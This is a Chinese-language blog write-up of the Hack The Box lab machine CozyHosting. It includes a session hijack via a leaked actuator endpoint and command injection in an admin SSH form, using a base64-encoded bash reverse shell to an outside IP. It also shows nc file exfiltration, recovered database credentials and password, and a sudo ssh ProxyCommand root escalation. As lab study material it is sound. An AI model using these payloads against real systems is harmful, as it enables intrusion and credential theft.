<!DOCTYPE html><html lang="zh-CN" id="theme-light-mode"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zIxyd"><title>CozyHosting(HTB) · zIxyd's Blog</title><meta name="description" content="信息搜集nmap123456sudo nmap -p- -sT --min-rate  3000 10.10.11.230PORT      STATE    SERVICE22/tcp    open     ssh80/tcp    open     http

dirsearch1234567"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/logo.png"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li><li><a class="fa fa-sun-o" onclick="darkLightToggle();"></a></li></div><div class="avatar"></div></div></div><div class="toc-container in-page animated fadeInDown"><details class="ltr toc-toggle"><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toclist-text">信息搜集</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#nmap"><span class="toclist-text">nmap</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#dirsearch"><span class="toclist-text">dirsearch</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%AF%BB%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="toclist-text">寻找漏洞</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E"><span class="toclist-text">利用漏洞</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#user-app"><span class="toclist-text">user-app</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#psql"><span class="toclist-text">psql</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#usr-josh"><span class="toclist-text">usr-josh</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#sudo-l"><span class="toclist-text">sudo -l </span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E8%A1%A5%E5%85%85"><span class="toclist-text">补充</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%80%BB%E7%BB%93"><span class="toclist-text">总结</span></a></li></ol></div></details></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/logo.png" style="width:220px;" alt="favicon"><h3 title=""><a href="/">zIxyd's Blog</a></h3><div class="description"><p>存放个人学习笔记的小窝，欢迎交流</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/zIxyd"><i class="fa fa-github"></i></a></li><li><a href="mailto:2972914692@qq.comm"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://res.abeim.cn/api-qq?qq=2972914692"><i class="fa fa-qq"></i></a></li></ul></div><div class="toc-container in-sidebar"><details class="ltr" open><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toclist-text">信息搜集</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#nmap"><span class="toclist-text">nmap</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#dirsearch"><span class="toclist-text">dirsearch</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%AF%BB%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="toclist-text">寻找漏洞</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E"><span class="toclist-text">利用漏洞</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#user-app"><span class="toclist-text">user-app</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#psql"><span class="toclist-text">psql</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#usr-josh"><span class="toclist-text">usr-josh</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#sudo-l"><span class="toclist-text">sudo -l </span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E8%A1%A5%E5%85%85"><span class="toclist-text">补充</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%80%BB%E7%BB%93"><span class="toclist-text">总结</span></a></li></ol></div></details></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> zIxyd</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><a href="https://github.com/Lhcfl/hexo-theme-anatolo" target="_blank">Anatolo </a></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>CozyHosting(HTB)</a></h3></div><div class="post-content"><p><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- -sT --min-rate  3000 10.10.11.230</span><br><span class="line"></span><br><span class="line">PORT      STATE    SERVICE</span><br><span class="line">22/tcp    open     ssh</span><br><span class="line">80/tcp    open     http</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://cozyhosting.htb/   </span><br><span class="line"></span><br><span class="line">[19:30:12] 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js                                   </span><br><span class="line">[19:30:18] 200 -  634B  - /actuator                                         </span><br><span class="line">[19:30:18] 200 -    5KB - /actuator/env                                     </span><br><span class="line">[19:30:19] 200 -   48B  - /actuator/sessions                                </span><br><span class="line">[19:30:19] 200 -   10KB - /actuator/mappings                                </span><br><span class="line">[19:30:19] 200 -   15B  - /actuator/health                                  </span><br><span class="line">[19:30:19] 200 -  124KB - /actuator/beans                                   </span><br><span class="line">[19:30:19] 401 -   97B  - /admin                                            </span><br><span class="line">[19:30:36] 200 -    0B  - /engine/classes/swfupload//swfupload.swf          </span><br><span class="line">[19:30:36] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf       </span><br><span class="line">[19:30:36] 500 -   73B  - /error                                            </span><br><span class="line">[19:30:37] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/ </span><br><span class="line">[19:30:37] 200 -    0B  - /extjs/resources//charts.swf                      </span><br><span class="line">[19:30:39] 200 -    0B  - /html/js/misc/swfupload//swfupload.swf            </span><br><span class="line">[19:30:41] 200 -   12KB - /index                                            </span><br><span class="line">[19:30:43] 200 -    4KB - /login                                            </span><br><span class="line">[19:30:43] 200 -    0B  - /login.wdm%2e                                     </span><br><span class="line">[19:30:43] 204 -    0B  - /logout    </span><br></pre></td></tr></table></figure>



<h3 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h3><p>在dirseach中的<code>/actuator/sessions </code>发现泄露了用户名和其session</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">98CE8721F7394050CE8CC45241821BAD	&quot;kanderson&quot;</span><br></pre></td></tr></table></figure>

<p>访问admin，用泄露的session尝试登陆，可以成功登陆</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: cozyhosting.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=98CE8721F7394050CE8CC45241821BAD</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<p>其中存在一处连接ssh的功能，这里存在rce漏洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20231211203117.png"></p>
<h4 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h4><p>经过测试发现对host和username均做了过滤处理，但是在username处只是不能包含空格，可以使用%0a和%09等URL编码绕过空格过滤。；username这里存在<code>rce</code>，但是不会有回显；但是可以给这条命令加上反引号导致回显(会将<code>uid=1001(app)</code>当作命令执行)，这有点像报错回显的感觉</p>
<p>HTTP 头中的 Location 字段用于指示客户端应该重定向到的 URL。当服务器返回带有 Location 头的响应时，客户端会自动重定向到指定的 URL。这通常用于实现页面重定向或者在需要时将客户端引导到另一个位置。Location 头通常与状态码 3xx（重定向）一起使用，以便告知客户端应该采取重定向操作。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20231211204121.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20231211204005.png"></p>
<p>于是构造payload反弹shell。(这后台还必须加一个分号才能反弹成功)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;&amp; /dev/tcp/10.10.16.45/5555 0&gt;&amp;1</span><br><span class="line">&#123;echo,YmFzaCAtaT4mIC9kZXYvdGNwLzEwLjEwLjE2LjQ1LzU1NTUgMD4mMQo=&#125;|&#123;base64,-d&#125;|bash;</span><br><span class="line">%7Becho%2CYmFzaCAtaT4mIC9kZXYvdGNwLzEwLjEwLjE2LjQ1LzU1NTUgMD4mMQo%3D%7D%7C%7Bbase64%2C-d%7D%7Cbash;</span><br></pre></td></tr></table></figure>

<h3 id="user-app"><a href="#user-app" class="headerlink" title="user-app"></a>user-app</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app@cozyhosting:/app$ ls</span><br><span class="line">cloudhosting-0.0.1.jar</span><br></pre></td></tr></table></figure>

<p>将<code>cloudhosting-0.0.1.jar</code>文件下载下来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">方法一</span><br><span class="line">nc -nv  10.10.16.45 8888 &lt;  cloudhosting-0.0.1.jar</span><br><span class="line">nc -lvvp 8888 &gt;  cloudhosting-0.0.1.jar</span><br><span class="line"></span><br><span class="line">方法二</span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>

<p>将文件用<code>jd-gui</code>反汇编，可以发现一对账号密码</p>
<p><img src="C:\Users\24603\AppData\Roaming\Typora\typora-user-images\image-20231211211457264.png" alt="image-20231211211457264"></p>
<p><code>cat /etc/passwd</code>中确实存在<code>postgres</code>用户;尝试ssh登陆一直失败，尝试登陆数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app:x:1001:1001::/home/app:/bin/sh</span><br><span class="line">postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</span><br><span class="line">josh:x:1003:1003::/home/josh:/usr/bin/bash</span><br></pre></td></tr></table></figure>

<h4 id="psql"><a href="#psql" class="headerlink" title="psql"></a>psql</h4><p><code>netstat -pantu | grep &quot;5432&quot;</code></p>
<p>netstat -pantu 是一个用于显示系统网络状态的命令。在这个命令中：</p>
<ul>
<li>-p 选项用于显示与进程相关的信息，包括进程 ID 和进程名称。</li>
<li>-a 选项用于显示所有的连接和监听端口。</li>
<li>-n 选项用于显示数字形式的 IP 地址和端口号，而不进行域名解析。</li>
<li>-t 选项用于显示 TCP 连接的信息。</li>
<li>-u 选项用于显示 UDP 连接的信息。</li>
</ul>
<p>因此，netstat -pantu 命令会显示系统上所有的 TCP 和 UDP 连接，以及与这些连接相关的进程信息。</p>
<p>端口 <code>5432 </code>通常用于 Po<code>stgreSQL </code>数据库管理系统。这个端口是<code>PostgreSQL</code>默认的数据库访问端口，用于客户端应用程序连接到 PostgreSQL 服务器。 PostgreSQL 是一个流行的开源关系型数据库管理系统，常用于各种类型的应用程序和网站。</p>
<p>登陆数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">psql -U postgres -h localhost</span><br><span class="line">Password for user postgres: Vg&amp;nvzAQ7XxR</span><br></pre></td></tr></table></figure>

<p>以下是一些常用的 psql 命令：</p>
<ol>
<li><p>连接到数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psql -U username -d dbname -h hostname</span><br></pre></td></tr></table></figure>
</li>
<li><p>列出数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\l</span><br></pre></td></tr></table></figure>
</li>
<li><p>连接到数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\c dbname</span><br></pre></td></tr></table></figure>
</li>
<li><p>列出表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\dt</span><br></pre></td></tr></table></figure>
</li>
<li><p>显示表结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\d table_name</span><br></pre></td></tr></table></figure>
</li>
<li><p>退出 psql：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\q</span><br></pre></td></tr></table></figure>



<p>在本题中敏感信息存放在<code>cozyhosting</code>库中的<code>users</code>表中</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cozyhosting=# select * from users;</span><br><span class="line">select * from users;</span><br><span class="line">   name    |                           password                           | role</span><br><span class="line">  </span><br><span class="line">-----------+--------------------------------------------------------------+-----</span><br><span class="line">--</span><br><span class="line"> kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User</span><br><span class="line"> admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>爆破<code>admin</code>的密码居然是用户<code>josh</code>的密码，这就有点离谱了；这里直接用<code>ssh</code>可以连接</p>
<h3 id="usr-josh"><a href="#usr-josh" class="headerlink" title="usr-josh"></a>usr-josh</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh josh@10.10.11.230</span><br><span class="line">manchesterunited	#输入密码</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20231211201340.png"></p>
<h4 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l "></a><code>sudo -l </code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">josh@cozyhosting:~$ sudo -l</span><br><span class="line">[sudo] password for josh: </span><br><span class="line">Matching Defaults entries for josh on localhost:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User josh may run the following commands on localhost:</span><br><span class="line">    (root) /usr/bin/ssh *</span><br></pre></td></tr></table></figure>

<p><code> (root) /usr/bin/ssh *</code>表示以root身份运行ssh，<code>*</code>表示可以使用任何参数</p>
<p>直接在这个网站寻找<code>ssh</code>sudo提权；<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/ssh/">clink me</a></p>
<p>最终使用提权命令如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh -o ProxyCommand=&#x27;;sh 0&lt;&amp;2 1&gt;&amp;2&#x27; x</span><br></pre></td></tr></table></figure>



<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>这是从<code>cloudhosting-0.0.1.jar</code>的一段代码；这应该就是实现<code>ssh</code>功能,过滤不当产生<code>rce</code>漏洞的地方</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BOOT-INF.classes.htb.cloudhosting.compliance;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ComplianceService</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">HOST_PATTERN</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^(?=.&#123;1,255&#125;$)[0-9A-Za-z](?:(?:[0-9A-Za-z]|-)&#123;0,61&#125;[0-9A-Za-z])?(?:\\.[0-9A-Za-z](?:(?:[0-9A-Za-z]|-)&#123;0,61&#125;[0-9A-Za-z])?)*\\.?$&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping(method = &#123;RequestMethod.POST&#125;, path = &#123;&quot;/executessh&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">executeOverSsh</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username, <span class="meta">@RequestParam(&quot;host&quot;)</span> String host, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">rbuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;/admin?error=&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      validateHost(host);</span><br><span class="line">      validateUserName(username);</span><br><span class="line">      <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, </span><br><span class="line">            </span><br><span class="line">            String.format(<span class="string">&quot;ssh -o ConnectTimeout=1 %s@%s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; username, host &#125;) &#125;);</span><br><span class="line">      (<span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getErrorStream()))).lines()</span><br><span class="line">        .forEach(line -&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (!line.startsWith(<span class="string">&quot;Pseudo-terminal&quot;</span>))</span><br><span class="line">              rbuilder.append(line); </span><br><span class="line">          &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException exception) &#123;</span><br><span class="line">      rbuilder.append(exception.getMessage());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">      rbuilder.append(<span class="string">&quot;ssh: Cannot connect to the host&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      response.sendRedirect(rbuilder.toString());</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validateUserName</span><span class="params">(String username)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (username.contains(<span class="string">&quot; &quot;</span>))</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Username can&#x27;t contain whitespaces!&quot;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validateHost</span><span class="params">(String host)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.HOST_PATTERN.matcher(host).matches())</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid hostname!&quot;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>namp</code>搜集开放<code>80</code>端口；<code>dirsearch</code>搜集到<code>/admin</code>路由,<code>/actuator/sessions   </code>路由；<code>/actuator/sessions   </code>路由中泄露了用户<code>kanderson</code>的session，可以用这session登陆到admin;在admin页面处的<code>ssh</code>功能应过滤不当存在<code>rce</code>漏洞，以至于可以反弹<code>shell</code>,得到<code>app</code>用户；又能在app用户中得到<code>cloudhosting-0.0.1.jar</code>,而<code>cloudhosting-0.0.1.jar</code>存在敏感信息；账号：<code>postgres</code>，密码：<code>Vg&amp;nvzAQ7XxR</code>;尝试ssh连接不成功，连接数据库(这里注意是psql，从进程中得到这个信息)；在数据库里能找到用户<code>josh</code>的密码:manchesterunited;ssh连接成功,<code>sudo -l</code>发现可以以root身份运行<code>ssh</code>命令，在网上可以找到对应的提权方法，最终拿到<code>root</code>。</p>
</p></div><div class="post-footer"><div class="tip">All rights reserved<br>Author: zIxyd</div><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-12-11</span><i class="fa fa-tag"></i><a class="tag" href="/tags/HTB/" title="HTB">HTB </a><span class="leancloud_visitors"></span><span>About 1637 words, 5 min 27 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/intent/tweet?text=I%20have%20found%20a%20great%20blog.%0A%0AzIxyd's%20Blog%20%C2%B7%20CozyHosting(HTB)%0Ahttps://zIxyd.github.io/2023/12/11/CozyHosting(HTB)/%0A"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/2023/12/09/Codify(HTB)/" title="Codify(HTB)">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/darkLightToggle.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>